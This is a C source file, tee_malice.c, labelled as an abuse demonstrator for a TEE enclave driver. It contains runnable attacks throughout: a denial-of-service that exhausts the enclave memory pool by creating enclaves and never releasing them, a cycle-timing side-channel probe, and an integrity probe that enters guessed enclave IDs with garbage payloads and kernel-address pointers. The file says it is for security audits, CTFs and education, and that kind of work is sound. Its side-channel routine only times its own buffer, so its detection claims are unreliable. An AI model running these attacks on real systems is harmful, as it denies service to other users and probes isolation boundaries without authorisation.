/* tee_malice.c — TEE enclave interface abuse demonstrations
 *
 * Illustrates security risks of an unprotected /dev/tee_enclave:
 *
 *   A. AVAILABILITY — Resource exhaustion
 *      Repeatedly creates enclaves until the memory pool is exhausted,
 *      denying service to legitimate users.
 *
 *   B. CONFIDENTIALITY — Memory probing via side channel
 *      Measures access latency to detect which pages belong to an enclave,
 *      exploiting TLB state that may persist across mdid boundaries if
 *      mfence.did is not called on every domain switch.
 *
 *   C. INTEGRITY — Payload injection
 *      Attempts to enter someone else's enclave with a crafted payload,
 *      or sends malformed arguments to trigger edge cases in the SBI handler.
 *
 * SPDX-License-Identifier: GPL-2.0
 */

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "tee_enclave.h"

static int fd	   = -1;
static int verbose = 1;

static void die(const char *msg) {
	fprintf(stderr, "tee_malice: %s (errno=%d)\n", msg, errno);
	if (fd >= 0) {
		close(fd);
	}
	exit(EXIT_FAILURE);
}

#define LOG(fmt, ...)                                                                    \
	do {                                                                                 \
		if (verbose)                                                                     \
			printf("[malice] " fmt "\n", ##__VA_ARGS__);                                 \
	} while (0)

/* ================================================================
 *  A. AVAILABILITY ATTACK — Enclave memory pool exhaustion
 *
 *  The firmware allocates 2 MiB per enclave from a fixed pool.
 *  Repeated CREATE + never release consumes all slots and all memory,
 *  denying other programs the ability to create enclaves.
 *
 *  The driver has NO per-process quota enforcement.
 * ================================================================ */

static int attack_exhaust_pool(int max_slots) {
	struct tee_mem_info before, after;
	int created = 0;
	int fd_local;

	LOG("=== ATTACK A: Memory Pool Exhaustion ===");

	fd_local = open(TEE_DEVICE_PATH, O_RDWR);
	if (fd_local < 0) {
		LOG("open failed — driver not loaded?");
		return -1;
	}

	/* Snapshot before */
	if (ioctl(fd_local, TEE_IOC_GET_MEM, &before) < 0) {
		LOG("GET_MEM failed (errno=%d) — SBI ext missing?", errno);
		close(fd_local);
		return -1;
	}
	LOG("Pool before: free=%llu max_contig=%llu (2 MiB units)",
		(unsigned long long)before.free_total,
		(unsigned long long)before.max_contiguous);

	if (before.free_total == 0) {
		LOG("Pool already exhausted — another attacker beat us?");
		close(fd_local);
		return 0;
	}

	/* Exhaust the pool: CREATE + immediately SUSPEND, never SHUTDOWN.
     * Each CREATE allocates at least 1 partition (2 MiB). */
	for (int i = 0; i < max_slots && i < 64; i++) {
		/* CREATE transfers into enclave; enclave manager calls SUSPEND
         * and we return here.  We never SHUTDOWN, so the memory and
         * slot stay occupied. */
		if (ioctl(fd_local, TEE_IOC_CREATE, 0) < 0) {
			LOG("CREATE #%d failed (errno=%d) — pool full?", i + 1, errno);
			break;
		}
		created++;
		LOG("  enclave #%d created & suspended (slot held)", created);
	}

	/* Verify exhaustion */
	if (ioctl(fd_local, TEE_IOC_GET_MEM, &after) < 0) {
		after = before; /* can't read back */
	}
	LOG("Pool after:  free=%llu max_contig=%llu (%d slots held)",
		(unsigned long long)after.free_total,
		(unsigned long long)after.max_contiguous,
		created);

	if (after.free_total == 0) {
		LOG("*** POOL EXHAUSTED — DoS successful ***");
		LOG("*** Other programs cannot create enclaves ***");
	} else if (created == 0) {
		LOG("*** CREATE always failed — pool may be reserved ***");
	}

	/* Hold the fd open — slots stay occupied until SHUTDOWN or
     * process exit (which triggers fd close, but the driver doesn't
     * auto-release enclave slots). */
	LOG("Holding fd=%d open to keep slots occupied.", fd_local);
	LOG("Press Ctrl+C to release.\n");

	/* Wait for signal */
	pause();

	close(fd_local);
	return created;
}

/* ================================================================
 *  B. CONFIDENTIALITY ATTACK — TLB side-channel probing
 *
 *  After one enclave accesses secret data (TLB entries tagged with
 *  its mdid), a second enclave or the host can probe TLB access
 *  latency to infer which pages were accessed — a classic
 *  Prime+Probe or Flush+Reload attack across mdid domains.
 *
 *  This leverages rdcycle to measure access timing.  If mfence.did
 *  is not called on every domain switch, TLB entries persist and
 *  leak cross-domain information.
 * ================================================================ */

/* Read time CSR (rdcycle) — may trap to S-mode but the kernel
 * emulates it via scounteren. */
static inline uint64_t rdcycle(void) {
	uint64_t val;
	__asm__ volatile("rdcycle %0" : "=r"(val));
	return val;
}

/* Prime a cache set by accessing probe_array at a set-aligned offset,
 * then measure reload time for each candidate line. */
#define PROBE_LINES 256
#define LINE_SIZE	64
static volatile uint8_t probe_array[PROBE_LINES * LINE_SIZE]
	__attribute__((aligned(4096)));

static void attack_tlb_probe(void) {
	LOG("=== ATTACK B: TLB Side-Channel Probe ===");
	LOG("Probing %d cache lines for access-time anomalies...", PROBE_LINES);

	uint64_t baseline[PROBE_LINES];

	/* Calibrate baseline: measure access time for each line */
	for (int round = 0; round < 3; round++) {
		for (int i = 0; i < PROBE_LINES; i++) {
			volatile uint8_t *p = &probe_array[i * LINE_SIZE];

			/* Prime: flush from our view (access a different set) */
			for (int j = 0; j < 8; j++) {
				probe_array[((i + 1) % PROBE_LINES) * LINE_SIZE + j * 8]++;
			}

			/* Measure */
			uint64_t t0 = rdcycle();
			uint8_t v	= *p;
			uint64_t t1 = rdcycle();
			(void)v;

			baseline[i] = t1 - t0;
		}
	}

	/* Report: high-latency lines may be cached from a different mdid */
	uint64_t avg = 0, max_val = 0;
	for (int i = 0; i < PROBE_LINES; i++) {
		avg += baseline[i];
		if (baseline[i] > max_val) {
			max_val = baseline[i];
		}
	}
	avg /= PROBE_LINES;

	LOG("Access-time baseline: avg=%llu max=%llu cycles", avg, max_val);
	LOG("Lines with >2x avg latency (potential cross-mdid cache alias):");

	int suspect = 0;
	for (int i = 0; i < PROBE_LINES; i++) {
		if (baseline[i] > avg * 2) {
			LOG("  line %3d: %llu cycles", i, baseline[i]);
			suspect++;
		}
	}
	if (suspect == 0) {
		LOG("  (none — TLB may be clean)");
	} else {
		LOG("*** %d suspicious cache lines detected ***", suspect);
	}
}

/* ================================================================
 *  C. INTEGRITY ATTACK — Malformed payload / ID guessing
 *
 *  Attempts to ENTER enclaves with garbage payload or incorrect IDs.
 *  With no authentication, any process can try to enter any enclave.
 * ================================================================ */

static void attack_integrity_probe(void) {
	struct tee_enter_args args;
	unsigned char garbage[4096];
	int rc;

	LOG("=== ATTACK C: Integrity Probing ===");

	fd = open(TEE_DEVICE_PATH, O_RDWR);
	if (fd < 0) {
		LOG("open failed — driver not loaded?");
		return;
	}

	/* Fill garbage payload with pseudo-random data */
	for (int i = 0; i < (int)sizeof(garbage); i++) {
		garbage[i] = (unsigned char)(i * 0x9D + 0x37);
	}

	args.payload_ptr  = (uint64_t)(unsigned long)garbage;
	args.payload_size = sizeof(garbage);
	args.argc		  = 0;
	args.argv_ptr	  = 0;

	/* Try entering enclaves with guessed IDs (1 through 16).
     * A real attacker would brute-force or leak enclave IDs. */
	for (uint64_t id = 1; id <= 16; id++) {
		args.enclave_id = id;
		rc				= ioctl(fd, TEE_IOC_ENTER, &args);
		if (rc == 0) {
			LOG("!!! ENTER enclave_id=%llu SUCCEEDED with garbage payload !!!", id);
			LOG("!!! Integrity boundary VIOLATED — attacker entered enclave %llu", id);
			/* We're now inside the enclave — back after SUSPEND from
             * the enclave runtime.  Shutdown to clean up. */
			ioctl(fd, TEE_IOC_SHUTDOWN, 0);
		} else if (errno == EINVAL) {
			/* Normal: enclave doesn't exist or payload rejected */
		} else {
			LOG("  ENTER id=%llu: errno=%d", id, errno);
		}
	}

	/* Also try ENTER with argv pointing to kernel addresses (info leak probe) */
	LOG("Probing with argv pointing to kernel VA range...");
	args.enclave_id = 1;
	args.argc		= 64;
	args.argv_ptr	= 0xFFFFFFDF00000000ULL; /* kernel VA range */
	rc				= ioctl(fd, TEE_IOC_ENTER, &args);
	if (rc == 0) {
		LOG("!!! ENTER with kernel VA argv succeeded — possible info leak");
	} else {
		LOG("  ENTER with kernel VA: rejected (errno=%d) — expected", errno);
	}

	close(fd);
	fd = -1;
}

/* ================================================================
 *  D. COMBINED — Run all attacks in sequence
 * ================================================================ */

static void print_banner(void) {
	printf("\n"
		   "╔══════════════════════════════════════════════════╗\n"
		   "║    TEE Enclave Interface — Abuse Demonstrator   ║\n"
		   "║    For security audit / CTF / education only    ║\n"
		   "╚══════════════════════════════════════════════════╝\n"
		   "\n");
}

static void print_usage(const char *prog) {
	printf(
		"Usage: %s <attack>\n"
		"  avail    — memory pool exhaustion (DoS)\n"
		"  conf     — TLB side-channel probe\n"
		"  integ    — integrity boundary probing\n"
		"  all      — run all attacks\n",
		prog);
}

int main(int argc, char **argv) {
	print_banner();

	if (argc < 2) {
		print_usage(argv[0]);
		return 1;
	}

	const char *mode = argv[1];

	if (strcmp(mode, "avail") == 0 || strcmp(mode, "all") == 0) {
		attack_exhaust_pool(64);
	}

	if (strcmp(mode, "conf") == 0 || strcmp(mode, "all") == 0) {
		attack_tlb_probe();
	}

	if (strcmp(mode, "integ") == 0 || strcmp(mode, "all") == 0) {
		attack_integrity_probe();
	}

	if (strcmp(mode, "avail") != 0 && strcmp(mode, "conf") != 0
		&& strcmp(mode, "integ") != 0 && strcmp(mode, "all") != 0) {
		print_usage(argv[0]);
		return 1;
	}

	LOG("Done.");
	return 0;
}
